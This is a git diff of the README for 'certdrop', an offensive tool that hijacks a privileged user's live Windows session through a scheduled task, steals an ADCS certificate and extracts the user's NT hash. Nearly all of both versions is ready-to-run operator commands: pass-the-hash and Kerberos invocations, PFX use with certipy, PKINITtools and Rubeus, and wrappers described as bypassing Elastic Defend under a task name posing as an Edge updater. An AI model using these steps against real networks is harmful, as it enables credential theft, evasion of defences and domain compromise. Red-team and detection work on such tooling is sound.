@@ -1,141 +1,89 @@
 # certdrop
 
-ADCS certificate theft via scheduled task session hijack.
+ADCS certificate theft via scheduled task session hijacking.
 
-When you have local admin on a host where a privileged user has an active RDP or console session, certdrop drops a scheduled task that runs in that user's live session context and requests an ADCS certificate on their behalf. The resulting PFX can be used for pass-the-cert / PKINIT authentication to retrieve the user's NT hash or a TGT.
-
-**Requirements on target:**
-- Local admin access to the target host
-- Target user has an active interactive session (RDP / console — Type 2 or Type 10 logon)
-- ADCS deployed in the domain with a user-enrollable template (e.g. `User`)
-- WinRM (port 5985) open and SMB (port 445) accessible from operator
-
----
+Drops a scheduled task on a target that runs in an active user's session context (`InteractiveToken`), enrolls a certificate via `certreq`, exports the PFX, and runs `certipy auth` to extract the NT hash.
 
 ## Install
 
-```bash
+```
 pip install -r requirements.txt
 ```
 
-> **Note:** If you hit pip conflicts with system packages on Kali, add `--break-system-packages`.
->
-> Kerberos auth uses pure impacket — no system kerberos libraries (no `libkrb5-dev`, no `pykerberos`) are required.
+Requires [certipy-ad](https://github.com/ly4k/Certipy) on PATH.
 
----
+For `--exec-method smb`, place [psexecsvc.py](https://github.com/sensepost/susinternals) alongside `certdrop.py`.
 
 ## Usage
 
 ```
-certdrop.py TARGET [options]
-
-positional:
-  TARGET          Target hostname (preferred) or IP
-
-authentication:
-  -u USERNAME     Username
-  -p PASSWORD     Plaintext password (prompted if omitted)
-  -H [LM:]NT      NT hash for pass-the-hash (NTLM only)
-  -d DOMAIN       Domain (e.g. corp.local)
-  -k              Use Kerberos (requires --dc-ip)
-  --dc-ip DC_IP   Domain controller IP — used as KDC and for DNS resolution
-
-certificate:
-  -ca CA          CA config string: CA_HOST\CA_NAME
-                  Omit to auto-discover via LDAP (single-CA forests)
-  -t TEMPLATE     Certificate template (default: User)
-
-task / delivery:
-  -n TASK_NAME    Scheduled task display name (default: MicrosoftEdgeUpdateCore)
-  --drop-dir DIR  Drop path on target (default: C:\Windows\Tasks)
-  --prefix PREFIX File/path prefix (default: cert)
-  -m METHOD       Execution wrapper: conhost | powershell | wscript
-                  (default: conhost)
-
-output:
-  -o OUT_DIR      Local directory for PFX output (default: output/)
-  --no-cleanup    Skip cleanup of task and files on target
-  --timeout N     Seconds to wait for PFX (default: 90)
+certdrop [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
 ```
 
----
+### Examples
 
-## Examples
-
-**NTLM — password:**
 ```bash
-python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1
+# Password auth, interactive session picker
+certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+
+# Target a specific user
+certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
+
+# Domain auth
+certdrop corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+
+# NTLM hash
+certdrop administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
+
+# Kerberos
+certdrop corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+
+# Kerberos with ccache
+export KRB5CCNAME=admin.ccache
+certdrop corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+
+# SMB exec (no WinRM needed)
+certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
+
+# Manual mode — generate files and print instructions only
+certdrop admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
+
+# Non-admin target (C:\Users\Public + cmd wrapper)
+certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
+  --drop-dir 'C:\Users\Public' --exec-wrapper cmd
 ```
 
-**NTLM — pass-the-hash:**
-```bash
-python3 certdrop.py TARGET_HOST -u administrator -H :a29f7623fd11550def0192de9246f46b -d corp.local --dc-ip 10.0.0.1
-```
+### Options
 
-**Kerberos:**
-```bash
-python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 -k
-```
-
-**Explicit CA (multi-CA environments or if auto-discover fails):**
-```bash
-python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 \
-  -ca "pki.corp.local\CORP-CA"
-```
-
-**Alternate exec method (if conhost is flagged):**
-```bash
-python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 \
-  -m wscript
-```
-
----
-
-## Using the PFX
-
-The PFX is exported with an empty password.
-
-**certipy (recommended):**
-```bash
-certipy-ad auth -pfx output/cert.pfx -dc-ip 10.0.0.1 -domain corp.local
-```
-
-**PKINITtools:**
-```bash
-python3 gettgtpkinit.py -cert-pfx output/cert.pfx -pfx-pass '' corp.local/jsmith jsmith.ccache
-KRB5CCNAME=jsmith.ccache python3 getnthash.py corp.local/jsmith
-```
-
-**Rubeus (from a Windows foothold):**
-```
-Rubeus.exe asktgt /user:jsmith /certificate:cert.pfx /password:"" /ptt
-```
-
----
-
-## Exec methods
-
-| Method | Command | Notes |
-|--------|---------|-------|
-| `conhost` | `conhost --headless cert.bat` | Default. Bypasses Elastic Defend process lineage checks. |
-| `powershell` | `powershell.exe -WindowStyle Hidden -File cert.bat` | Most compatible; noisier parent process. |
-| `wscript` | `wscript.exe //B //NoLogo cert.vbs` | Adds a VBScript stub. Indirect chain: `wscript → cmd → certreq/certutil`. |
-
----
+| Flag | Description |
+|------|-------------|
+| `-ca HOST\CA` | CA config string (required) |
+| `-dc IP` | Domain controller IP (required) |
+| `-tu USER` | Target user (skip session picker) |
+| `-H [LM:]NT` | NTLM hash |
+| `-k` | Kerberos auth |
+| `--aes-key HEX` | AES key for Kerberos |
+| `--exec-method` | `winrm` (default), `smb`, `manual` |
+| `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
+| `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
+| `--template` | Certificate template (default: `User`) |
+| `--timeout` | PFX wait timeout in seconds (default: 90) |
+| `--ldap-shell` | LDAP shell via certipy instead of NT hash |
+| `--no-cleanup` | Leave files and task on target |
 
 ## How it works
 
-1. Connects to the target over WinRM and enumerates active logon sessions (`query session`)
-2. You pick which session to target interactively
-3. Auto-discovers the ADCS CA from domain LDAP (`pKIEnrollmentService`)
-4. Generates three files in memory:
-   - `cert.inf` — certificate request configuration
-   - `cert.bat` — `certreq` / `certutil` chain that requests, exports, and cleans up the cert
-   - `cert.xml` — scheduled task definition targeting the chosen user
-5. Uploads files via SMB to `C:\Windows\Tasks\` (or `--drop-dir`)
-6. Registers the task via `schtasks /create /xml` (runs as the targeted user's live session)
-7. Immediately fires it with `schtasks /run`
-8. Polls for `cert.pfx` via WinRM; downloads it via SMB when it appears
-9. Deletes the task and all dropped files
+1. Connects via WinRM (default) or SMB (psexecsvc)
+2. Enumerates active sessions and resolves domain via WMI
+3. Uploads `cert.inf`, `cert.bat`, `cert.xml` via SMB
+4. Creates scheduled task with `InteractiveToken` — runs in the target user's live session
+5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
+6. Polls for PFX via SMB, downloads it
+7. Runs `certipy auth` to extract NT hash
+8. Cleans up remote files and task
 
-The scheduled task runs with `Logon Mode: Interactive only`, meaning it executes in the target user's existing session token — including their certificate store, DPAPI keys, and full domain credentials. No plaintext password for the target user is ever needed.
+## Credits
+
+- Technique from [NetExec PR #908](https://github.com/Pennyw0rth/NetExec/pull/908) by [@Tw1sm](https://github.com/Tw1sm)
+- SMB execution via [susinternals](https://github.com/sensepost/susinternals) by [@sensepost](https://github.com/sensepost)
+- Certificate auth via [Certipy](https://github.com/ly4k/Certipy) by [@ly4k](https://github.com/ly4k)
